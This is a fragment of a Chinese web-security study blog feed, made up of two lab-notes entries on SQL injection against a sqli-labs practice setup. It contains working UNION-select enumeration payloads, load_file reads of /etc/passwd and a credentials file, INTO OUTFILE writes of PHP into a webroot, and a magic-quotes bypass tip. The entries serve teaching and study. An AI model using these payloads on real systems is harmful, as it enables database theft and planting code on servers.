operator">=</span>数据库用户B——<span class="token operator">></span>表名——<span class="token operator">></span>列名——<span class="token operator">></span>数据数据库C<span class="token operator">=</span>网站C<span class="token operator">=</span>数据库用户C——<span class="token operator">></span>表名——<span class="token operator">></span>列名——<span class="token operator">></span>数据</code></pre><p><strong>备注：</strong>这样的好处一个用户对应一个库、这样网站之间的数据互不干扰，当然这是最基础的数据库模型，现在大网站都是分布式数据库。</p><h4 id="●-在数据库中查询有哪些用户"><a href="#●-在数据库中查询有哪些用户" class="headerlink" title="● 在数据库中查询有哪些用户"></a><font size="4"><strong>● 在数据库中查询有哪些用户</strong></font></h4><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> use mysql<span class="token punctuation">;</span>Database changedmysql<span class="token operator">></span> <span class="token keyword">select</span> host,user,password from user<span class="token punctuation">;</span>+--------------+------+----------+<span class="token operator">|</span> host         <span class="token operator">|</span> user <span class="token operator">|</span> password <span class="token operator">|</span>+--------------+------+----------+<span class="token operator">|</span> localhost    <span class="token operator">|</span> root <span class="token operator">|</span>          <span class="token operator">|</span><span class="token operator">|</span> 2c8a2316583a <span class="token operator">|</span> root <span class="token operator">|</span>          <span class="token operator">|</span><span class="token operator">|</span> 127.0.0.1    <span class="token operator">|</span> root <span class="token operator">|</span>          <span class="token operator">|</span><span class="token operator">|</span> ::1          <span class="token operator">|</span> root <span class="token operator">|</span>          <span class="token operator">|</span>+--------------+------+----------+4 rows <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>mysql<span class="token operator">></span></code></pre><h4 id="●-在源码中查看使用的是哪一个用户"><a href="#●-在源码中查看使用的是哪一个用户" class="headerlink" title="● 在源码中查看使用的是哪一个用户"></a><font size="4"><strong>● 在源码中查看使用的是哪一个用户</strong></font></h4><pre class=" language-bash"><code class="language-bash">root@2c8a2316583a:/var/www/html<span class="token comment" spellcheck="true"># cat sql-connections/db-creds.inc</span><span class="token operator">&lt;</span>?php//give your mysql connection username n password<span class="token variable">$dbuser</span> <span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">;</span><span class="token variable">$dbpass</span> <span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span><span class="token variable">$dbname</span> <span class="token operator">=</span><span class="token string">"security"</span><span class="token punctuation">;</span><span class="token variable">$host</span> <span class="token operator">=</span> <span class="token string">'localhost'</span><span class="token punctuation">;</span><span class="token variable">$dbname1</span> <span class="token operator">=</span> <span class="token string">"challenges"</span><span class="token punctuation">;</span>?<span class="token operator">></span></code></pre><p>一般在网站安装的时候会指定数据库的用户名和密码这里指定的是root用户密码为空指定的数据库是security</p><p> 跨库查询的前提条件是必须<font color=" red"><strong>高权限</strong></font>的用户才能执行跨库查询。<br>?id&#x3D;-1%20union%20select%201,schema_name,3%20from%20information_schema.schemata<br><img src="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/4.png"></p><h4 id="●-数据库中执行"><a href="#●-数据库中执行" class="headerlink" title="● 数据库中执行"></a><font size="4"><strong>● 数据库中执行</strong></font></h4><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> SELECT * FROM <span class="token function">users</span> WHERE id<span class="token operator">=</span>-1 union <span class="token keyword">select</span> 1,schema_name,3 from information_schema.schemata LIMIT 0,1<span class="token punctuation">;</span>+----+--------------------+----------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username           <span class="token operator">|</span> password <span class="token operator">|</span>+----+--------------------+----------+<span class="token operator">|</span>  1 <span class="token operator">|</span> information_schema <span class="token operator">|</span> 3        <span class="token operator">|</span>+----+--------------------+----------+1 row <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>mysql<span class="token operator">></span></code></pre><h4 id="●-1、获取到所有的数据库名称"><a href="#●-1、获取到所有的数据库名称" class="headerlink" title="● 1、获取到所有的数据库名称"></a><font size="4"><strong>● 1、获取到所有的数据库名称</strong></font></h4><p>union select 1,group_concat(schema_name),3 from information_schema.schemata<br>备注：GROUP_CONCAT函数将分组中的字符串与各种选项进行连接。<br><img src="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/5.png"><br>等同于在数据库中执行以下命令</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> use security<span class="token punctuation">;</span>Reading table information <span class="token keyword">for</span> completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql<span class="token operator">></span> SELECT * FROM <span class="token function">users</span> WHERE id<span class="token operator">=</span>-1 union <span class="token keyword">select</span> 1,group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span>,3 from information_schema.schemata  LIMIT 0,1<span class="token punctuation">;</span>+----+----------------------------------------------------------------------+----------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username                                                             <span class="token operator">|</span> password <span class="token operator">|</span>+----+----------------------------------------------------------------------+----------+<span class="token operator">|</span>  1 <span class="token operator">|</span> information_schema,book,challenges,mysql,performance_schema,security <span class="token operator">|</span> 3        <span class="token operator">|</span>+----+----------------------------------------------------------------------+----------+1 row <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>mysql<span class="token operator">></span></code></pre><h4 id="●-2、指定获取book库中的表名信息"><a href="#●-2、指定获取book库中的表名信息" class="headerlink" title="● 2、指定获取book库中的表名信息"></a><font size="4"><strong>● 2、指定获取book库中的表名信息</strong></font></h4><p><img src="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/6.png"><br>union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;’book’</p><p>等同于在数据库中执行以下命令</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> SELECT * FROM <span class="token function">users</span> WHERE id<span class="token operator">=</span>-1 union <span class="token keyword">select</span> 1,group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span>,3 from information_schema.tables where table_schema<span class="token operator">=</span><span class="token string">'book'</span>  LIMIT 0,1<span class="token punctuation">;</span>+----+----------+----------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username <span class="token operator">|</span> password <span class="token operator">|</span>+----+----------+----------+<span class="token operator">|</span>  1 <span class="token operator">|</span> book     <span class="token operator">|</span> 3        <span class="token operator">|</span>+----+----------+----------+1 row <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>mysql<span class="token operator">></span></code></pre><h4 id="●-3、获取指定数据库book下的book表的列名信息"><a href="#●-3、获取指定数据库book下的book表的列名信息" class="headerlink" title="● 3、获取指定数据库book下的book表的列名信息"></a><font size="4"><strong>● 3、获取指定数据库book下的book表的列名信息</strong></font></h4><p><img src="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/7.png"><br>union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;’book’ and table_schema&#x3D;’book’<br>等同于以下的数据库命</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> use security<span class="token punctuation">;</span>Reading table information <span class="token keyword">for</span> completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql<span class="token operator">></span> SELECT * FROM <span class="token function">users</span> WHERE id<span class="token operator">=</span>-1 union <span class="token keyword">select</span> 1,group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span>,3 from information_schema.columns where table_name<span class="token operator">=</span><span class="token string">'book'</span> and table_schema<span class="token operator">=</span><span class="token string">'book'</span>  LIMIT 0,1<span class="token punctuation">;</span>+----+------------------------------------------------+----------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username                                       <span class="token operator">|</span> password <span class="token operator">|</span>+----+------------------------------------------------+----------+<span class="token operator">|</span>  1 <span class="token operator">|</span> book_id,book_title,book_author,submission_date <span class="token operator">|</span> 3        <span class="token operator">|</span>+----+------------------------------------------------+----------+1 row <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>mysql<span class="token operator">></span></code></pre><h4 id="●-4、查询到指定数据"><a href="#●-4、查询到指定数据" class="headerlink" title="● 4、查询到指定数据"></a><font size="4"><strong>● 4、查询到指定数据</strong></font></h4><p><img src="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/8.png"></p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> SELECT * FROM <span class="token function">users</span> WHERE id<span class="token operator">=</span>-1 union  <span class="token keyword">select</span> book_id,book_title,book_author from book.book  LIMIT 0,1<span class="token punctuation">;</span>+----+----------+----------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username <span class="token operator">|</span> password <span class="token operator">|</span>+----+----------+----------+<span class="token operator">|</span>  1 <span class="token operator">|</span> Linux    <span class="token operator">|</span> oldjiang <span class="token operator">|</span>+----+----------+----------+1 row <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>mysql<span class="token operator">></span></code></pre><p>备注：username和password字段是users表中的字段，又因为查询到的数据为空执行后面的联合字句的时候将内容填充到下面所以获取到的内容并不是十分准确，另外要内容十分准确必须要满足book表和user表的结构完全相同</p><h3 id="三、文件读写函数"><a href="#三、文件读写函数" class="headerlink" title="三、文件读写函数"></a><font size="5"><strong>三、文件读写函数</strong></font></h3><p>参考地址：<a href="https://www.sqlsec.com/2020/11/mysql.html">https://www.sqlsec.com/2020/11/mysql.html</a><br>load_file文件读取<br>into outfile 或into dumpfile文件写入</p><p>查询是否有写入的权限</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> show global variables like <span class="token string">'%secure_file_priv%'</span><span class="token punctuation">;</span>+------------------+-------+<span class="token operator">|</span> Variable_name    <span class="token operator">|</span> Value <span class="token operator">|</span>+------------------+-------+<span class="token operator">|</span> secure_file_priv <span class="token operator">|</span>       <span class="token operator">|</span>+------------------+-------+</code></pre><table>    <thead>        <tr>            <th>Value</th>            <th>说明</th>        </tr>    </thead>    <tbody>        <tr>            <td>NULL</td>            <td>不允许导入或导出</td>        </tr>        <tr>            <td>/tmp</td>            <td>只允许在 /tmp 目录导入导出</td>        </tr>        <tr>            <td>空</td>            <td>不限制目录</td>        </tr>    </tbody></table><p><font color=" red"><strong>在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件<br>在 MySQL 5.5之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件</strong></font></p><h4 id="●-文件读取"><a href="#●-文件读取" class="headerlink" title="● 文件读取"></a><font size="4"><strong>● 文件读取</strong></font></h4><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> load_file<span class="token punctuation">(</span><span class="token string">'/etc/passwd'</span><span class="token punctuation">)</span>\G<span class="token punctuation">;</span>*************************** 1. row ***************************load_file<span class="token punctuation">(</span><span class="token string">'/etc/passwd'</span><span class="token punctuation">)</span>: root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System <span class="token punctuation">(</span>admin<span class="token punctuation">)</span>:/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinlibuuid:x:100:101::/var/lib/libuuid:syslog:x:101:104::/home/syslog:/bin/falsemysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false1 row <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>ERROR:No query specifiedmysql<span class="token operator">></span></code></pre><p>读取敏感信息：<a href="https://blog.csdn.net/weixin_30292843/article/details/99381669">https://blog.csdn.net/weixin_30292843/article/details/99381669</a><br>在网站上面读取内容:?id&#x3D;-2%20union%20select%201,load_file(%27&#x2F;etc&#x2F;passwd%27),3<br><img src="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/9.png"></p><p>读取数据库的配置信息<br>?id&#x3D;-1%20union%20select%201,load_file(%27&#x2F;var&#x2F;www&#x2F;html&#x2F;sql-connections&#x2F;db-creds.inc%27),3<br><img src="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/10.png"></p><p>右击查看源代码<br><img src="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/11.png"></p><h4 id="●-文件写入"><a href="#●-文件写入" class="headerlink" title="● 文件写入"></a><font size="4"><strong>● 文件写入</strong></font></h4><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token string">'&lt;?php phpinfo() ?>'</span> into outfile <span class="token string">'./php'</span><span class="token punctuation">;</span>Query OK, 1 row affected <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>mysql<span class="token operator">></span>root@06026a1599f9:/<span class="token comment" spellcheck="true"># cat /var/lib/mysql/php</span><span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span> ?<span class="token operator">></span>mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token string">'&lt;?php phpinfo() ?>'</span> into outfile <span class="token string">'/var/www/php'</span><span class="token punctuation">;</span>ERROR 1 <span class="token punctuation">(</span>HY000<span class="token punctuation">)</span>: Can<span class="token string">'t create/write to file '</span>/var/www/php' <span class="token punctuation">(</span>Errcode: 13<span class="token punctuation">)</span>mysql<span class="token operator">></span></code></pre><p>在linux中默认是对&#x2F;var&#x2F;lib&#x2F;mysql目录下有写入权限对其他目录是没有写入权限。<br>对目录修改权限测试</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token string">'&lt;?php phpinfo() ?>'</span> into outfile <span class="token string">'/var/www/html/test.php'</span><span class="token punctuation">;</span>ERROR 1 <span class="token punctuation">(</span>HY000<span class="token punctuation">)</span>: Can<span class="token string">'t create/write to file '</span>/var/www/html/test.php<span class="token string">' (Errcode: 13)mysql> \qroot@06026a1599f9:/# chmod -Rf 777 /var/www/html/root@06026a1599f9:/# mysqlmysql> select '</span><span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span> ?<span class="token operator">></span><span class="token string">' into outfile '</span>/var/www/html/test.php'<span class="token punctuation">;</span>mysql<span class="token operator">></span></code></pre><p>在网页上写入<br><img src="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/12.png"></p><pre class=" language-bash"><code class="language-bash">root@06026a1599f9:/var/lib/mysql<span class="token comment" spellcheck="true"># pwd</span>/var/lib/mysqlroot@06026a1599f9:/var/lib/mysql<span class="token comment" spellcheck="true"># ls -l test.php</span>-rw-rw-rw- 1 mysql mysql 23 Jun 18 12:17 test.phproot@06026a1599f9:/var/lib/mysql<span class="token comment" spellcheck="true"># cat test.php</span>1       <span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span> ?<span class="token operator">></span>      3root@06026a1599f9:/var/lib/mysql<span class="token comment" spellcheck="true">#</span></code></pre><h3 id="四、魔术引号开关"><a href="#四、魔术引号开关" class="headerlink" title="四、魔术引号开关"></a><font size="5"><strong>四、魔术引号开关</strong></font></h3><p>魔术引号设计的初衷是为了让从数据库或文件中读取数据和从请求中接收参数时，<font color=" red"><strong>对单引号、双引号、反斜线、NULL加上一个一个反斜线进行转义</strong></font>，这个的作用跟addslashes()的作用完全相同。</p><p>正确地接收和读取数据，从而正确地执行SQL语句，防止恶意的SQL注入。</p><p>简单的SQL注入示例，假设有一个数据库user，我们要传一个参数查询某个用户的信息，我们会调用某个接口，传一个参数给接口，类似于http:&#x2F;&#x2F;域名&#x2F;?c&#x3D;xxx&amp;a&#x3D;xxx&amp;user&#x3D;xxx，现在我们想查询一个叫codeman的人的信息，那么user&#x3D;codeman，后台接收到参数之后，执行类似于下面的SQL语句。</p><pre class=" language-bash"><code class="language-bash">SELECT * FROM <span class="token variable"><span class="token variable">`</span>user<span class="token variable">`</span></span> WHERE <span class="token variable"><span class="token variable">`</span>user<span class="token variable">`</span></span> <span class="token operator">=</span> <span class="token string">'codeman'</span><span class="token punctuation">;</span></code></pre><p>如果在接收数据时后台不进行转义，那么久可能让恶意的SQL注入攻击发生，假设我们现在传递一个user&#x3D;codeman’or’1’&#x3D;’1，传到后台执行的SQL语句变成：</p><pre class=" language-bash"><code class="language-bash">SELECT * FROM <span class="token variable"><span class="token variable">`</span>user<span class="token variable">`</span></span> WHERE <span class="token variable"><span class="token variable">`</span>user<span class="token variable">`</span></span> <span class="token operator">=</span> <span class="token string">'codeman'</span> or <span class="token string">'1'</span> or <span class="token string">'1'</span><span class="token punctuation">;</span></code></pre><h3 id="●-1、为什么在PHP5-4-0及其之后PHP版本中被取消了呢"><a href="#●-1、为什么在PHP5-4-0及其之后PHP版本中被取消了呢" class="headerlink" title="● 1、为什么在PHP5.4.0及其之后PHP版本中被取消了呢?"></a><font size="4"><strong>● 1、为什么在PHP5.4.0及其之后PHP版本中被取消了呢?</strong></font></h3><pre class=" language-bash"><code class="language-bash">PHP 5.5.9-1ubuntu4.13 <span class="token punctuation">(</span>cli<span class="token punctuation">)</span> <span class="token punctuation">(</span>built: Sep 29 2015 15:24:49<span class="token punctuation">)</span>Copyright <span class="token punctuation">(</span>c<span class="token punctuation">)</span> 1997-2014 The PHP GroupZend Engine v2.5.0, Copyright <span class="token punctuation">(</span>c<span class="token punctuation">)</span> 1998-2014 Zend Technologies   with Zend OPcache v7.0.3, Copyright <span class="token punctuation">(</span>c<span class="token punctuation">)</span> 1999-2014, by Zend Technologiesroot@06026a1599f9:/<span class="token comment" spellcheck="true"># grep magic /etc/php5/apache2/php.ini</span>root@06026a1599f9:/<span class="token comment" spellcheck="true"># grep magic /etc/php5/cli/php.ini</span></code></pre><p>(1)可移植性:<br>编程时认为其打开或并闭都会影响到移植性。可以用 get_magic_quotes_gpc() 来检查是否打开，并据此编程。 </p><p>(2）性能<br>        由于并不是每一段被转义的数据都要插入数据库的，如果所有进入 PHP 的数据都被转义的话，那么会对程序的执行效率产生一定的影响。在运行时调用转义函数（如 addslashes()）更有效率。 尽管 php.ini-dist 默认打开了这个选项，但是 php.ini-recommended 默认却关闭了它，主要是出于性能的考虑。</p><p>（3）方便<br>由于不是所有数据都需要转义，在不需要转义的地方看到转义的数据就很烦。比如说通过表单发送邮件，结果看到一大堆的 ‘。针对这个问题，可以使用 stripslashes() 函数处理。</p><h3 id="●-2、phpstudy环境中PHP版本选择为5-2-17时在php-ini文件中魔术引号的开关"><a href="#●-2、phpstudy环境中PHP版本选择为5-2-17时在php-ini文件中魔术引号的开关" class="headerlink" title="● 2、phpstudy环境中PHP版本选择为5.2.17时在php.ini文件中魔术引号的开关"></a><font size="4"><strong>● 2、phpstudy环境中PHP版本选择为5.2.17时在php.ini文件中魔术引号的开关</strong></font></h3><p><img src="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/13.png"></p><p>选择SQL注入的关卡1阅读源码$sql&#x3D;”SELECT * FROM users WHERE id&#x3D;’$id’ LIMIT 0,1”;这一句中我们要是想注入的话必须让前面的’闭合，但是我们开启了魔术引号开关我发生这样的事情。</p><p><img src="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/14.png"></p><p>就是在我们注入的时候添加的’会在之后会自动添加&#39;将我们注入语句给注释掉从而失败。将魔术引号关闭之后然后重启phpstudy就可以正常的注入。<br><img src="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/15.png"><br><img src="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/16.png"></p><h3 id="●-3、由于docker搭建的环境是PHP5-5版本的没有魔术引号、故不做演示"><a href="#●-3、由于docker搭建的环境是PHP5-5版本的没有魔术引号、故不做演示" class="headerlink" title="● 3、由于docker搭建的环境是PHP5.5版本的没有魔术引号、故不做演示"></a><font size="4"><strong>● 3、由于docker搭建的环境是PHP5.5版本的没有魔术引号、故不做演示</strong></font></h3><p>开启了魔术引号之后<br><img src="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/16.png"></p><h3 id="●-4、绕过方法"><a href="#●-4、绕过方法" class="headerlink" title="● 4、绕过方法"></a><font size="4"><strong>● 4、绕过方法</strong></font></h3><p>采用<font color=" red"><strong>hex(16进制)</strong></font>编码绕过因为对路径进行编码之后魔术引号不会再对其生效也就是说绕过了魔术引号的作用达到绕过。<br>编码软件:winhex</p><h3 id="五、int函数"><a href="#五、int函数" class="headerlink" title="五、int函数"></a><font size="5"><strong>五、int函数</strong></font></h3><p>对输入的数字进行判断是否</p><pre class=" language-bash"><code class="language-bash">if<span class="token punctuation">(</span>is_int<span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">))</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id=<span class="token variable">$id</span> LIMIT 0,1"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$sql</span><span class="token punctuation">;</span>    <span class="token variable">$result</span><span class="token operator">=</span>mysql_query<span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;else&amp;#123;</span>    <span class="token keyword">echo</span> <span class="token string">'ni shi ge jj?'</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span></code></pre><p><img src="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/16.png"></p><p>防护软件一般也是对关键字进行防护、触发了waf等安全软件规则会将数据包丢弃。</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-012</title>
      <link href="/2023/09/25/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-012/"/>
      <url>/2023/09/25/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-012/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB漏洞-SQL-注入-一"><a href="#WEB漏洞-SQL-注入-一" class="headerlink" title="WEB漏洞-SQL 注入(一)"></a><font size="6"><strong>WEB漏洞-SQL 注入(一)</strong></font></h2><span id="more"></span><h3 id="一、前言知识"><a href="#一、前言知识" class="headerlink" title="一、前言知识"></a><font size="5"><strong>一、前言知识</strong></font></h3><p>前言：在本系列课程学习中，SQL注入漏洞将是重点部分，其中SQL注入又非常复杂，区分各种数据库类型，提交方法，数据类型等注入，我们需要按部就班的学习，才能学会相关SQL注入的核心。同样此类漏洞是WEB安全中严重的安全漏洞，学习如何利用，挖掘，修复也是很重要的。<br><img src="/2023/09/25/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-012/1.png"></p><h3 id="二、SQL注入原理"><a href="#二、SQL注入原理" class="headerlink" title="二、SQL注入原理"></a><font size="5"><strong>二、SQL注入原理</strong></font></h3><h4 id="●1-理解SQL注入"><a href="#●1-理解SQL注入" class="headerlink" title="●1.理解SQL注入"></a><font size="4"><strong>●1.理解SQL注入</strong></font></h4><p>  SQL注入是一种将SQL代码插入或添加到应用（用户）的输入参数中的攻击，之后再将这些参数传递给后台的sql服务器加以解析和执行。由于sql语句本身的多样性，以及可用于构造sql语句的编程方法很多，因此凡是构造sql语句的步骤均存在被攻击的潜在风险。Sql注入的方式主要是直接将代码插入参数中，这些参数会被置入sql命令中加以执行。间接的攻击方式是将恶意代码插入字符串中，之后将这些字符串保存到数据库的数据表中或将其当成元数据。当将存储的字符串置入动态sql命令中时，恶意代码就将被执行。</p><p>  如果web应用未对动态构造的sql语句使用的参数进行正确性审查（即便使用了参数化技术），攻击者就很可能会修改后台sql语句的构造。如果攻击者能够修改sql语句，那么该语句将与应用的用户具有相同的权限。当使用sql服务器执行与操作系统交互命令时，该进程将与执行命令的组件（如数据库服务器、应用服务器或web服务器）拥有相同的权限，这种权限的级别通常很高。如果攻击者执行以上恶意代码的插入操作成功，那么用户数据库服务器或者整个应用会遭到破坏，甚至被控制。 </p><h4 id="●2-sql注入的产生过程及常见原因"><a href="#●2-sql注入的产生过程及常见原因" class="headerlink" title="●2.sql注入的产生过程及常见原因"></a><font size="4"><strong>●2.sql注入的产生过程及常见原因</strong></font></h4><p>  <strong>○2.1产生过程</strong><br>  大多数的web应用都需要与数据库进行交互，并且大多数web应用编程语言（如ASP、C##、.NET、Java和PHP）均提供了可编程的方法来与数据库连接并进行交互。如果web应用开发人员无法确保在将从web表单，cookie及输入参数等收到的值传递给sql查询（该查询在数据库服务器上执行）之前已经对其进行过验证，那么通常会出现sql注入漏洞，如果攻击者能够控制发送给sql查询的输入，并且能够操纵该输入将其解析为代码而非数据，那么攻击者就很有可能有能力在后台数据库执行该代码。</p><p>  <strong>○2.2常见的sql注入产生原因</strong><br>  基于此，SQL注入的产生原因通常表现在以下几方面：①转义字符处理不合适；②不安全的数据库配置；③不合理的查询集处理；④不当的错误处理；⑤多个提交处理不当。 </p><p>  <strong>○2.2.1不当的处理类型</strong><br>  Sql数据库将单引号字符（’）解析成代码与数据间的分界线：单引号外面的内容军事需要运行的代码，而用单引号引起来的内容均是数据。因为只需要简单的在URL或WEB页面的字段中输入一个单引号，就能很快速的识别出web站点是否会受到sql注入攻击。 </p><p>  <strong>○2.2.2不安全的数据库配置</strong><br>  数据库带有很多默认的用户预安装内容。SQL Server使用声名狼藉的“sa”作为数据库系统管理员账户，MySQL使用“root”和“anonymous”用户账户，Oracle则在创建数据库时通常会创建SYS、SYSTEM、DBSNMP和OUTLN账户。这些并非是全部的账号，知识比较出名的账户中的一部分，还有很多其他的账户。其他账户同样按默认方式进行预设，口令总所周知。</p><p>这就带来了很大的安全风险，攻击者利用sql注入漏洞时，通常会常识访问数据库的元数据，比如内部的数据库和表的名称、列的数据类型和访问权限，例如MySQL服务器的元数据位于information_schema虚拟数据库中，可通过show databases；和show tables；命令访问。所有的MySQL用户均有权限访问该数据库中的表，但只能查看表中那些与该用户访问权限相对应的对象的行。</p><p>  <strong>○2.2.3不合理的查询集处理</strong><br>  有时需要使用动态的sql语句对某些复杂的应用进行编码，因为程序开发阶段可能还不知道要查询的表或字段（或者不存在）。比如与大型数据库交互的应用，这些数据库在定期创建的表中的数据由于应用已经产生了输入，因而开发人员会信任该数据，攻击者可以使用自己的表和字段数据来替换应用产生的值，从而影响系统的返回值。</p><p>  <strong>○2.2.4不当的错误处理</strong><br>  错误处理不当会为web站点带来很多安全方面的问题。最常见的问题是将详细的内部错误消息（如错误代码，数据库转存储）显示给用户或攻击。这些错误消息会泄露实现细节，为攻击者提供与网站潜在缺陷相关的重要线索。 </p><p>  <strong>○2.2.5多个提交处理不当</strong><br>  大型的web开发项目会出现这样的问题：有些开发人员会对输入进行验证，而一些开发人员则不以为然。对于开发人员，团队，甚至公司来说，彼此独立工作的情形并不少见，很难保证项目中每个人都遵循相同的标准。</p><p>应用打开发人员还倾向于围绕用户来设计应用，他们尽可能的使用预期的处理流程来引导用户，认为用户将遵循他们已经设计好的逻辑顺序。</p><p>例如：当用户已到达一系列表单中的第三个表单时，他们会期望用户肯定已经完成第一个和第二个表达。但实际上，借助URL乱序来请求资源，能够非常容易的避开预期的数据流程。 </p><h3 id="三、mysql注入"><a href="#三、mysql注入" class="headerlink" title="三、mysql注入"></a><font size="5"><strong>三、mysql注入</strong></font></h3><p><img src="/2023/09/25/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-012/2.png"></p><h3 id="四、忍者系统安装"><a href="#四、忍者系统安装" class="headerlink" title="四、忍者系统安装"></a><font size="5"><strong>四、忍者系统安装</strong></font></h3><p>参考博客：<a href="https://blog.csdn.net/qq_35258210/article/details/115457883">https://blog.csdn.net/qq_35258210/article/details/115457883</a></p><p>将镜像下载好使用VM安装，我给该系统分配了70个G硬盘，6G内存<br>镜像下载链接：链接: <a href="https://pan.baidu.com/s/1CAw9ztIUhCZgydNWHHWINg">https://pan.baidu.com/s/1CAw9ztIUhCZgydNWHHWINg</a> 密码: a33b</p><p><strong>注意：</strong><br>1、刚开始安装的时候vm可能无法读取到镜像、在进入的时候按enter键，其余的步骤和上面的博客一致、不在赘述。安装完成后截图,由于忍者系统是基于win10开发的而内存也给的相对比较大在使用的过程中很有可能出现卡顿的情况建议使用vm player打开忍者系统。</p><p>2、开始使用的时候忍者系统有两个网卡建议禁用两个让其中的一个通信<br>密码：toor<br><img 